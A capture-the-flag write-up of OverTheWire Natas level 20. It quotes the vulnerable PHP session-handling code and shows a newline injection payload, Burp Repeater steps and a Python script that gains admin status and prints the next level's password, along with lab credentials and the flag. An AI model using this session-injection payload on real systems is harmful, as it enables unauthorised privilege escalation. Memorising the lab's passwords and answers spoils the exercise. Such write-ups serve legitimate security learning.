# Natas Level 20 Writeup (natas20) – OverTheWire

## Overview

This level focuses on exploiting a **session data injection** vulnerability.
The goal is to find the password for the next level.

## Observation

When we open the page, we see an input field:

> **"Your name:"**

There is also a link to view the source code:

```text
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite

1. Open the source code.

2. We can see that the application stores the `name` value in the session:

   ```php
   $_SESSION["name"] = $_REQUEST["name"];
   ```

3. The session data is written using a newline:

   ```php
   foreach($_SESSION as $key => $value) {
       $data .= "$key $value\n";
   }
   ```

4. When the session is read, the data is split by newline:

   ```php
   foreach(explode("\n", $data) as $line) {
       debug("Read [$line]");
       $parts = explode(" ", $line, 2);
       if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
   }
   ```

5. Because the input is not sanitized, we can inject a new line into the session data.

6. Payload used:

   ```text
   test
   admin 1
   ```

   URL encoded Payload:

   ```text
   test%0Aadmin%201
   ```

7. Send request to `Repeater`, then put our crafted Payload in request and send it to server twice.
    ```text
    name=test%0Aadmin%201
    ```

9. The application now treats us as an admin and displays the password for **natas21**.

#### Proof

```text
Username: natas21
Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```

### Using Python

```python
import requests, re

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'slOKYGsjlJhaqKliGvrgWAzln0JyrWao')

session = requests.Session()

payload = 'test\nadmin 1'

session.get(target, auth=auth, params={'name': payload})

r = session.get(target, auth=auth)

match = re.search(r'Password:\s(\w{32})', r.text)
print(f"Password for next level is: {match.group(1)}")
```

## Vulnerability

The application does not properly sanitize the `name` input.

By adding a newline, we can inject another session variable:

```text
admin 1
```

The application then reads it as a separate session value and gives us admin access.

## Flag

`7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU`
